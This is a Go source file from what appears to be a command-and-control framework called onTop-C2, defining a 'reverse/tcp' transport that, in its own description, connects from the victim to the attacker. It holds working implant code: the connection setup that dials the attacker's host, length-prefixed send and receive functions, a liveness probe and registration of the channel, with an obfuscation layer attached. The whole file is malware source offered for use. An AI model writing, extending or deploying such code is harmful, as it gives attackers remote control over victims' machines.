package rituals

import (
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"time"

	// "github.com/Yyax13/onTop-C2/src/misc"
	"github.com/Yyax13/onTop-C2/src/fidelius"
	"github.com/Yyax13/onTop-C2/src/types"
)

var reverse_tcp types.Ritual = types.Ritual{
	Name: "reverse/tcp",
	Description: "Create a reverse TCP ritual from inferi (victim) to caster (attacker)",
	Fidelius: fidelius.Basic_bjump,
	Init: reverse_tcpInit{},

}

type reverse_tcpFloo struct{
	conn net.Conn

}

type reverse_tcpInit struct{}

func (r *reverse_tcpFloo) Send(data []byte) (error) {
	dataLen := uint32(len(data))
	dataLenBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(dataLenBuf, dataLen)

	if _, err := r.conn.Write(dataLenBuf); err != nil {
		return fmt.Errorf("send: failed to send data len: %w", err)

	}

	if _, err := r.conn.Write(data); err != nil {
		return fmt.Errorf("send: failed to send data: %w", err)

	}

	return nil

}

func (r *reverse_tcpFloo) Receive() ([]byte, error) {
	dataLenBuf := make([]byte, 4)
	if _, err := io.ReadFull(r.conn, dataLenBuf); err != nil {
		return nil, fmt.Errorf("receive: failed to receive data len: %w", err)

	}
	
	lenBuf := binary.BigEndian.Uint32(dataLenBuf)
	data := make([]byte, lenBuf)

	if _, err := io.ReadFull(r.conn, data); err != nil {
		return nil, fmt.Errorf("receive: failed to receive data: %w", err)

	}

	return data, nil

}

func (r *reverse_tcpFloo) Close() (error) {
	return r.conn.Close()

}

func (r *reverse_tcpFloo) IsActive() (bool) {
	_ = r.conn.SetWriteDeadline(time.Now().Add(time.Millisecond * 900))
	_, err := r.conn.Write([]byte("are you alive??"))
	r.conn.SetWriteDeadline(time.Time{})
	return err == nil

}

func (t reverse_tcpInit) InitArcane(host, target string, f types.Fidelius) (*types.ArcaneLink, error) {
	_, tryToReach := net.Dial("tcp", host)
	if tryToReach != nil {
		return &types.ArcaneLink{}, fmt.Errorf("can't reach host %s, check it and try again", host)
	
	}

	connection, err := net.Dial("tcp", host)
	if err != nil {
		return &types.ArcaneLink{}, err

	}

	return &types.ArcaneLink{
		Network: &reverse_tcpFloo{
			conn: connection, 
		
		},
		ClientScrool: &types.Scroll{},
		Fidelius: f,
		
	}, nil

}

func init() {
	RegisterNewRitual(&reverse_tcp)

}